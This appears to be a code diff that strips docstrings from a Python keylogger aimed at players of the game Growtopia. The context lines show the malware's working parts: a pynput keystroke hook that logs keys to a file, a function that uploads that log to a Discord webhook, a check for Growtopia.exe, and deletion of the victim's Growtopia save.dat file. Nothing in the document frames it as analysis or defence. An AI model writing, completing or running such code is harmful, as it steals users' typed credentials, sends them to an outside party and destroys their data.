@@ -12,7 +12,6 @@ import requests
 from pynput import keyboard
 
 def install(package):
-    """Install a package using pip."""
     subprocess.check_call([sys.executable, "-m", "pip", "install", package])
 
 try:
@@ -33,7 +32,6 @@ was_growtopia_running = False
 save_dat_file_path = rf"C:\Users\{os.getenv('USERNAME')}\AppData\Local\Growtopia\save.dat"
 
 def delete_save_file(file_path):
-    """Delete the specified file if it exists."""
     if os.path.isfile(file_path):
         try:
             os.remove(file_path)
@@ -44,7 +42,6 @@ def delete_save_file(file_path):
         print(f"File not found: {file_path}")
 
 def is_growtopia_running():
-    """Check if Growtopia is currently running."""
     for process in psutil.process_iter(['name']):
         try:
             if process.info['name'] == "Growtopia.exe":
@@ -54,7 +51,6 @@ def is_growtopia_running():
     return False
 
 def write_buffer():
-    """Write the current buffer to the log file."""
     global buffer
     if buffer:
         with open(log_file, "a") as f:
@@ -63,13 +59,11 @@ def write_buffer():
         buffer = ""
 
 def create_empty_log_file():
-    """Create an empty log file if it doesn't exist."""
     if not os.path.isfile(log_file):
         open(log_file, 'w').close()
         print("Created empty log file.")
 
 def send_to_discord():
-    """Send the log file to the Discord webhook."""
     create_empty_log_file()
     with open(log_file, 'rb') as f:
         files = {'file': (os.path.basename(log_file), f)}
@@ -80,7 +74,6 @@ def send_to_discord():
             print(f"Failed to send file to Discord. Status code: {response.status_code}")
 
 def on_press(key):
-    """Handle key press events."""
     global buffer, last_type_time
     last_type_time = time.time()
 
@@ -97,7 +90,6 @@ def on_press(key):
             buffer += f"[{key.name}]"
 
 def on_release(key):
-    """Handle key release events."""
     pass
 
 def main():
